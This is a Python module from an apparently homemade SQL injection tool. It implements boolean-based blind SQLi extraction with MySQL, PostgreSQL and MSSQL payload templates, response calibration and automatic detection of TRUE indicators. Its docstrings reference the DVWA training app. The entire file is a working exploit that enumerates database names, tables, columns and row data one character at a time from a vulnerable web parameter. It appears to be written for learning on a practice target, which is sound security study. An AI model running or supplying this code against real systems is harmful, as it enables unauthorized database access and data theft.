"""
boolean_blind.py - Phase 2: Boolean-Based Blind SQLi (FIXED)

WHAT CHANGED FROM THE BROKEN VERSION:
    1. Added 'extra_params' support — DVWA needs Submit=Submit
       to actually process the form. Without it, the page just 
       renders an empty form every time (same size = can't detect).
    
    2. Added text-based detection as PRIMARY method.
       Instead of relying on response SIZE (unreliable when pages
       have dynamic content), we look for specific TEXT that only 
       appears when the query returns results.
       
       For DVWA: when the query succeeds, the page shows "Surname"
       When it fails, "Surname" is absent.
    
    3. Improved calibration to auto-detect the true_indicator
       if the user doesn't provide one.
"""

from sqli_tool.core.requester import Requester
from sqli_tool.core.utils import calculate_average, size_differs
from config import Config


class BooleanBlindExtractor:
    """
    Extracts data character-by-character using boolean-based blind SQLi.
    
    FIXED VERSION — properly handles:
    - Extra required parameters (like Submit=Submit)
    - Text-based TRUE/FALSE detection
    - Auto-detection of true/false indicators
    """

    PAYLOAD_TEMPLATES = {
        "mysql": {
            "database_name": "1' AND SUBSTRING(database(),{pos},1)='{char}'-- ",
            "table_name": (
                "1' AND SUBSTRING(("
                "SELECT table_name FROM information_schema.tables "
                "WHERE table_schema=database() LIMIT {index},1"
                "),{pos},1)='{char}'-- "
            ),
            "column_name": (
                "1' AND SUBSTRING(("
                "SELECT column_name FROM information_schema.columns "
                "WHERE table_name='{table}' LIMIT {index},1"
                "),{pos},1)='{char}'-- "
            ),
            "data": (
                "1' AND SUBSTRING(("
                "SELECT {column} FROM {table} LIMIT {index},1"
                "),{pos},1)='{char}'-- "
            ),
            "length_database": "1' AND LENGTH(database())={length}-- ",
            "count_tables": (
                "1' AND (SELECT COUNT(*) FROM information_schema.tables "
                "WHERE table_schema=database())={count}-- "
            ),
        },
        "postgresql": {
            "database_name": (
                "1' AND SUBSTRING(current_database(),{pos},1)='{char}'-- "
            ),
        },
        "mssql": {
            "database_name": (
                "1' AND SUBSTRING(DB_NAME(),{pos},1)='{char}'-- "
            ),
        },
    }

    def __init__(self, url, cookies, param_name="id", method="GET",
                 true_indicator=None, false_indicator=None, db_type="mysql",
                 inject_into="param", header_name=None, max_length=64,
                 extra_params=None):
        """
        Initialize the boolean blind extractor.

        Args:
            url (str): Target URL
            cookies (dict): Session cookies
            param_name (str): Vulnerable parameter name (e.g., "id")
            method (str): HTTP method ("GET" or "POST")
            true_indicator (str): Text that ONLY appears in TRUE responses.
                                  For DVWA: "Surname" 
            false_indicator (str): Text that ONLY appears in FALSE responses.
            db_type (str): Database type ("mysql", "postgresql", "mssql")
            inject_into (str): Where to inject ("param" or "header")
            header_name (str): Header name if inject_into="header"
            max_length (int): Maximum string length to extract
            extra_params (dict): ADDITIONAL parameters required by the form.
                                 For DVWA: {"Submit": "Submit"}
                                 THIS WAS THE MISSING PIECE!
        """
        self.url = url
        self.requester = Requester(cookies=cookies)
        self.param_name = param_name
        self.method = method
        self.true_indicator = true_indicator
        self.false_indicator = false_indicator
        self.db_type = db_type
        self.inject_into = inject_into
        self.header_name = header_name
        self.max_length = max_length
        self.charset = Config.CHARSET
        self.templates = self.PAYLOAD_TEMPLATES.get(db_type, {})
        self.extra_params = extra_params or {}

        # These will be set during calibration
        self.true_size = 0
        self.false_size = 0
        self.true_text = ""
        self.false_text = ""

    def calibrate(self):
        """
        Learn what TRUE and FALSE responses look like.

        WHAT CHANGED:
            Now also stores the full response TEXT so we can auto-detect
            differences between TRUE and FALSE responses, even when
            the sizes are identical.
        """
        print("[*] Calibrating TRUE/FALSE responses...")

        # ── Send a known TRUE condition ──
        true_payload = "1' AND '1'='1'-- "
        true_response = self._inject(true_payload)
        self.true_size = true_response.content_length
        self.true_text = true_response.text
        print(f"    TRUE  response size: {self.true_size} bytes")

        # ── Send a known FALSE condition ──
        false_payload = "1' AND '1'='2'-- "
        false_response = self._inject(false_payload)
        self.false_size = false_response.content_length
        self.false_text = false_response.text
        print(f"    FALSE response size: {self.false_size} bytes")

        # ── Analyze the difference ──
        if self.true_size != self.false_size:
            diff = abs(self.true_size - self.false_size)
            print(f"    ✅ Size difference: {diff} bytes — using size detection")
        else:
            print("    ⚠️  Sizes are identical — switching to TEXT detection")
            
            # Auto-detect a true_indicator if user didn't provide one
            if not self.true_indicator:
                self._auto_detect_indicator()

        print()

    def _auto_detect_indicator(self):
        """
        Automatically find text that appears in TRUE but not FALSE responses.

        What's going on:
            We split both responses into lines, then find lines that exist
            in the TRUE response but NOT in the FALSE response.
            Any such line is a reliable indicator of a TRUE condition.
            
            Common indicators in web apps:
            - DVWA: "Surname", "First name"
            - Login pages: "Welcome", "Dashboard"
            - Search pages: "results found", specific data
        """
        print("    [*] Auto-detecting TRUE indicator...")
        
        true_lines = set(self.true_text.splitlines())
        false_lines = set(self.false_text.splitlines())
        
        # Lines unique to the TRUE response
        unique_true_lines = true_lines - false_lines

        if unique_true_lines:
            # Pick the most meaningful line (longest non-empty, stripped)
            candidates = []
            for line in unique_true_lines:
                stripped = line.strip()
                # Skip empty lines and very short lines
                if len(stripped) > 3:
                    candidates.append(stripped)
            
            if candidates:
                # Sort by length and pick a medium-length one
                candidates.sort(key=len)
                # Pick one from the middle — not too short, not too long
                mid = len(candidates) // 2
                chosen = candidates[mid]
                
                # Extract a clean, short substring to use as indicator
                # (avoid HTML tags, pick readable text)
                import re
                # Try to extract plain text content
                text_parts = re.findall(r'>([^<]+)<', chosen)
                if text_parts:
                    self.true_indicator = text_parts[0].strip()
                else:
                    # Use first 30 chars of the line
                    self.true_indicator = chosen[:50]
                
                print(f"    ✅ Auto-detected indicator: \"{self.true_indicator}\"")
                print(f"       (This text appears in TRUE but not FALSE responses)")
            else:
                print("    ❌ Could not auto-detect. Trying common indicators...")
                self._try_common_indicators()
        else:
            print("    ❌ Responses appear identical at line level.")
            self._try_common_indicators()

    def _try_common_indicators(self):
        """
        Try well-known indicator strings for common vulnerable apps.
        """
        common_indicators = [
            "Surname", "surname",
            "First name", "first name", 
            "Last name", "last name",
            "Welcome", "welcome",
            "exists", "found",
            "result", "success",
        ]
        
        for indicator in common_indicators:
            if indicator in self.true_text and indicator not in self.false_text:
                self.true_indicator = indicator
                print(f"    ✅ Found working indicator: \"{indicator}\"")
                return
        
        # Last resort: character-by-character diff
        print("    ⚠️  No common indicators found.")
        print("    💡 TIP: Manually inspect TRUE vs FALSE responses and provide")
        print("       --true-text 'some unique text' when running the tool.")
        print("       Falling back to size-based detection (may be unreliable).")

    def _inject(self, payload):
        """
        Send a request with the payload injected.

        WHAT CHANGED:
            Now MERGES extra_params with the injection payload.
            This ensures Submit=Submit (and any other required params)
            are always included in the request.
        """
        if self.inject_into == "header":
            # For header injection, send extra_params as regular params
            headers = {self.header_name: payload}
            return self.requester.get(self.url, headers=headers,
                                       params=self.extra_params)
        elif self.method == "POST":
            # Merge payload with extra params
            data = {self.param_name: payload}
            data.update(self.extra_params)
            return self.requester.post(self.url, data=data)
        else:
            # GET request — merge payload param with extra params
            params = {self.param_name: payload}
            params.update(self.extra_params)  # <-- THIS IS THE KEY FIX
            return self.requester.get(self.url, params=params)

    def _is_true(self, response):
        """
        Determine if a response indicates TRUE.

        WHAT CHANGED:
            Now uses a priority-based detection:
            1. If true_indicator is set → text matching (most reliable)
            2. If false_indicator is set → inverse text matching
            3. Fallback → size comparison
        """
        # Method 1: Check for TRUE indicator text
        if self.true_indicator:
            return self.true_indicator in response.text
        
        # Method 2: Check for FALSE indicator text (inverse)
        if self.false_indicator:
            return self.false_indicator not in response.text

        # Method 3: Fallback to size comparison
        if self.true_size != self.false_size:
            true_diff = abs(response.content_length - self.true_size)
            false_diff = abs(response.content_length - self.false_size)
            return true_diff < false_diff
        
        # Cannot determine — return False to avoid false positives
        return False

    def _extract_string(self, payload_key, max_len=None, **kwargs):
        """
        Extract a string character by character.
        (Same algorithm as before, no changes needed here)
        """
        max_len = max_len or self.max_length
        template = self.templates.get(payload_key)

        if not template:
            print(f"    [!] No template for '{payload_key}' in {self.db_type}")
            return ""

        extracted = ""

        for pos in range(1, max_len + 1):
            found = False

            for char in self.charset:
                payload = template.format(pos=pos, char=char, **kwargs)
                response = self._inject(payload)

                if self._is_true(response):
                    extracted += char
                    print(f"\r    [+] Extracting: {extracted}", end="", flush=True)
                    found = True
                    break

            if not found:
                break

        print()  # New line after extraction
        return extracted

    def extract_database_name(self):
        """Extract the current database name."""
        print("[*] Phase 2: Extracting database name via Boolean Blind SQLi...")
        self.calibrate()

        db_name = self._extract_string("database_name")
        print(f"    [✓] Database name: {db_name}\n")
        return db_name

    def extract_table_names(self, max_tables=10):
        """Extract table names from the current database."""
        print("[*] Extracting table names...")
        tables = []

        for i in range(max_tables):
            print(f"    [*] Table #{i + 1}:")
            name = self._extract_string("table_name", index=i)

            if not name:
                print(f"    [*] No more tables found (total: {len(tables)})")
                break

            tables.append(name)
            print(f"    [✓] Found table: {name}")

        return tables

    def extract_column_names(self, table_name, max_columns=20):
        """Extract column names for a specific table."""
        print(f"[*] Extracting columns from '{table_name}'...")
        columns = []

        for i in range(max_columns):
            print(f"    [*] Column #{i + 1}:")
            name = self._extract_string("column_name", table=table_name, index=i)

            if not name:
                print(f"    [*] No more columns found (total: {len(columns)})")
                break

            columns.append(name)
            print(f"    [✓] Found column: {name}")

        return columns

    def extract_data(self, table_name, column_name, max_rows=10):
        """Extract actual data from a table column."""
        print(f"[*] Extracting data from {table_name}.{column_name}...")
        data = []

        for i in range(max_rows):
            print(f"    [*] Row #{i + 1}:")
            value = self._extract_string(
                "data", table=table_name, column=column_name, index=i
            )

            if not value:
                print(f"    [*] No more data (total: {len(data)} rows)")
                break

            data.append(value)
            print(f"    [✓] Value: {value}")

        return data

    def full_extraction(self):
        """Run a complete extraction: database → tables → columns → data."""
        print("=" * 60)
        print("FULL BOOLEAN BLIND EXTRACTION")
        print("=" * 60)

        db_name = self.extract_database_name()
        tables = self.extract_table_names()

        schema = {}
        for table in tables:
            columns = self.extract_column_names(table)
            schema[table] = columns

        print("\n" + "=" * 60)
        print("DISCOVERED DATABASE SCHEMA")
        print("=" * 60)
        print(f"Database: {db_name}")
        for table, columns in schema.items():
            print(f"  Table: {table}")
            for col in columns:
                print(f"    - {col}")

        return {
            "database": db_name,
            "tables": tables,
            "schema": schema,
        }